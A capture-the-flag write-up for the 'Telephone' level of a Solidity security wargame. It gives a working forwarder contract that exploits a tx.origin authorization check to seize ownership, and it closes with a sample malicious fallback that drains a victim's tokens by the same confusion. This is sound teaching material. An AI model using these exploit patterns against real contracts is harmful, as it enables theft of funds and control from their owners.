# 4. Telephone
**Claim ownership of the contract below to complete this level.**

```
  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
```

create a forwarding function to so tx.owner != msg.sender

TelephoneForwarder.sol
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneForwarder {
    address telephoneAddress;
    
    function setTelephoneAddress(address _telephoneAddress) public {
       telephoneAddress = _telephoneAddress;
    }
    
    function _changeOwner(address _owner) public {
        ITelephone(telephoneAddress).changeOwner(_owner);
    }
    
}
```

first
call setTelephoneAddress(instance contract address)
then
call _changeOwner(player wallet address)

**END**

	Level completed!

	Difficulty 1/10

	While this example may be simple, confusing tx.origin with msg.sender can lead to phishing-style attacks, such as this.

	An example of a possible attack is outlined below.

		Use tx.origin to determine whose tokens to transfer, e.g.

	function transfer(address _to, uint _value) {
	  tokens[tx.origin] -= _value;
	  tokens[_to] += _value;
	}

		Attacker gets victim to send funds to a malicious contract that calls the transfer function of the token contract, e.g.

	function () payable {
	  token.transfer(attackerAddress, 10000);
	}

		In this scenario, tx.origin will be the victim's address (while msg.sender will be the malicious contract's address), resulting in the funds being transferred from the victim to the attacker.

